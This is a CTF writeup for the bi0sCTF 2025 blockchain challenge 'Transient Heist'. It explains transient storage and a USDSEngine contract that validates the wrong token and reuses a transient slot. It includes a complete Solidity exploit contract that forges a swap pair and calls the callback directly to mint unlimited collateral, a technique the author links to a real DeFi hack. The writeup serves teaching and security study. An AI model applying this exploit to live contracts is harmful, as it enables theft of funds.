---
layout: post
title: "Transient Heist - bi0sCTF 2025"
date: 2025-06-21 15:00:00 +0000
description: "Writeup for the Transient Heist blockchain CTF challenge from bi0sCTF 2025"
categories: [Writeups, Challenges, Web3 Security]
tags: [transient storage exploitation, swap callback exploitation]
author: s4bot3ur
toc: true
---

Writeup for a blockchain CTF challenge.

**tl;dr**

- The challenge revolves around **transient storage confusion** and **incorrect input validation**.
- `USDSEngine` mistakenly checks `_otherToken` instead of `_collateralToken`, allowing fake tokens to be accepted.
- It also uses the same transient slot for both **swap pair validation** and **storing the excess vault amount**.
- The excess amount can be crafted to match a malicious contract's address, allowing reentry into the contract during execution with calls appearing to come from the `bi0sSwapPair`.
- Since the transient slot now holds our malicious contract address, the validation passes, enabling **Unlimited Collateral Deposits and USDS Minting.**

<!--more-->

**Challenge Points:** 980  
**No. of solves:** 7  
**Challenge Author:** [s4bot3ur](https://x.com/s4bot3ur)

## Challenge Description

They said memory fades — but some secrets linger just long enough.
A value set, then forgotten... unless you catch it mid-breath.
No storage, no logs, yet the truth lies between one call and the next.
Can you see what was never meant to stay?

## Introduction

This challenge revolves around two core contracts: `Setup.sol` and `USDSEngine.sol`. The `USDSEngine` contract serves as the minting and burning engine for the `USDS` stablecoin. Users can deposit approved collateral into the `USDSEngine` and mint `USDS` tokens in return.

The objective of the challenge is to exploit a vulnerability in the `USDSEngine` contract and deposit an **unlimited amount of collateral** in a way that causes the `Setup::isSolved()` function to return true. This function returns true if the collateral deposited by the player into the `USDSEngine` is greater than `uint256(keccak256("YOU NEED SOME BUCKS TO GET FLAG"))`.

## Key Concepts To Learn

Inorder to solve this challenge you need to understand how transient storage works.

### Transient Storage

**Transient storage is similar to normal storage in the EVM—the key difference lies in its persistence**. When you store a value in regular storage, it remains there as long as the contract exists or until it is explicitly erased. In contrast, transient storage persists only for the duration of a single transaction.

A great use case for transient storage is in reentrancy guards. A traditional reentrancy guard might look like this:

```javascript
contract ReEntrancyGuard{
    error ReEntrancyGuard__ReEntrancy__Prohibited();
    bool entered;

    modifier nonReEntrant(){
        if(entered){
            revert ReEntrancyGuard__ReEntrancy__Prohibited();
        }
        entered=true;
        _;
        entered=false;
    }
}
```

While this approach works, it relies on regular storage, which is expensive. Reentrancy guards like this consume more gas because of costly **SSTORE** and **SLOAD** operations. This is where transient storage offers a cheaper alternative.

For the reentrancy guard above, if we use regular storage, the gas costs will be approximately:

- **2,100 gas** for the SLOAD
- **20,000 gas** for the initial SSTORE (zero -> non-zero)
- **2,100 gas** for a cold slot access
- **100 gas** for resetting the value to zero

**Total:** `~24,300 gas`

For the same reentrancy guard shown above, if we use transient storage instead, the gas costs will be approximately:

- **100 gas** for TLOAD
- **100 gas** for initial TSTORE
- **100 gas** for resetting via TSTORE

**Total:** `~300 gas`

Transient Storage Reentrancy guard might look something like:

```javascript
contract ReEntrancyGuard{
    error ReEntrancyGuard__ReEntrancy__Prohibited();

    modifier nonReEntrant(){
        bool _entered
        assembly{
            _entered:=tload(0)
        }
        if(_entered){
            revert ReEntrancyGuard__ReEntrancy__Prohibited();
        }
        assembly{
            tstore(0,1)
        }
        _;
        assembly{
            tstore(0,0)
        }
    }
}
```

## Understanding the Vulnerability

The vulnerability lies in the following two functions of the `USDSEngine` contract:

```javascript
    function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public
            acceptedToken(_otherToken)returns (uint256 tokensSentToUserVault)
    {
        IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount);
        IBi0sSwapPair bi0sSwapPair=IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken));
        assembly{
            tstore(1,bi0sSwapPair)
        }
        bytes memory data=abi.encode(_collateralDepositAmount);
        IERC20(_otherToken).approve(address(bi0sSwapPair), swapAmount);
        bi0sSwapPair.swap(_otherToken, swapAmount, address(this),data);
        assembly{
            tokensSentToUserVault:=tload(1)
        }
    }

    function bi0sSwapv1Call(address sender,address collateralToken,uint256 amountOut,bytes memory data) external nonReEntrant {
        uint256 collateralDepositAmount=abi.decode(data,(uint256));
        address bi0sSwapPair;
        assembly{
            bi0sSwapPair:=tload(1)
        }
        if(msg.sender!=bi0sSwapPair){
            revert USDSEngine__Only__bi0sSwapPair__Can__Call();
        }
        if(collateralDepositAmount>amountOut){
            revert USDSEngine__Insufficient__Collateral();
        }
        uint256 tokensSentToUserVault=amountOut-collateralDepositAmount;
        user_vault[sender][collateralToken]+=tokensSentToUserVault;
        assembly{
            tstore(1,tokensSentToUserVault)
        }
        collateralDeposited[sender][collateralToken]+=collateralDepositAmount;
    }
```

The issue here is that `USDSEngine::depositCollateralThroughSwap` is incorrectly treating the other token as the collateral token and the collateral token as the other token. In the modifier, it uses `acceptedToken(_otherToken)` instead of `acceptedToken(_collateralToken)`. This means we can create a fake token, establish a fake pair, and deposit collateral in whatever amount we want.

Additionally, the contract uses **transient storage** (via `tstore` and `tload`) to temporarily store and retrieve data within a transaction. In `USDSEngine::depositCollateralThroughSwap`, the contract stores the address of the `swap pair` in **transient slot 1**, which is later read inside `USDSEngine::bi0sSwapv1Call` to verify that the callback is coming from the expected contract. However, later in the same callback, the contract overwrites this **transient slot** with the amount of tokens credited to the user's vault, so it can return this value to the caller. The problem is that the contract does not clear the **transient slot** before returning.

## The Exploit

```javascript
contract Exploit is ERC20{
    Setup setup;
    IBi0sSwapFactory factory;
    WETH weth;
    USDSEngine usdsEngine;
    constructor(address _setup) ERC20("FAKE","FAKE"){
        _mint(address(this),type(uint256).max);
        setup=Setup(_setup);
        factory=setup.bi0sSwapFactory();
        usdsEngine=setup.usdsEngine();
        weth=setup.weth();
    }
    function pwn()public payable{
        bytes32 FLAG_HASH=keccak256("YOU NEED SOME BUCKS TO GET FLAG");
        address _fakePair=factory.createPair(address(weth), address(this));
        IBi0sSwapPair fakePair=IBi0sSwapPair(_fakePair);
        weth.deposit{value:1001}(address(this));
        weth.transfer(_fakePair,1000);
        _transfer(address(this), _fakePair, uint256(uint160(address(this)))*1e10);
        fakePair.addLiquidity(address(this));
        weth.approve(address(usdsEngine), 1);
        uint256 swapOutAmount=getSwapOutAmount(1,fakePair);
        usdsEngine.depositCollateralThroughSwap(address(weth), address(this),1 , swapOutAmount-uint256(uint160(address(this))));
        uint256 InitialAmount=uint256(FLAG_HASH)+1+uint256(uint160(address(this)));
        bytes memory data=abi.encode(uint256(FLAG_HASH)+1);
        usdsEngine.bi0sSwapv1Call(address(this), address(weth),InitialAmount, data);
        usdsEngine.bi0sSwapv1Call(address(this), address(setup.safeMoon()), uint256(FLAG_HASH)+1, data);
        setup.setPlayer(address(this));
        console.log(setup.isSolved());
    }
}
```

## Conclusion

This bug stems from improper token validation and unsafe reuse of transient storage without clearing it. By carefully crafting the return value, we can reenter the contract and repeatedly bypass the expected checks, ultimately minting an unlimited amount of USDS stablecoins.

**FLAG:**`bi0sctf{eth:0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f:tx}`

This challenge is inspired by the [SIR Trading Hack](https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f).

The local setup for this challenge is available in the following two repositories:

1. [bi0s](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Transient-Heist): This is the exact setup used during the CTF.
2. [s4bot3ur](https://github.com/s4bot3ur/ctf-by-s4bot3ur/tree/main/bi0s-ctf-2025/Transient-Heist): This is a simpler setup for solving the challenge locally.
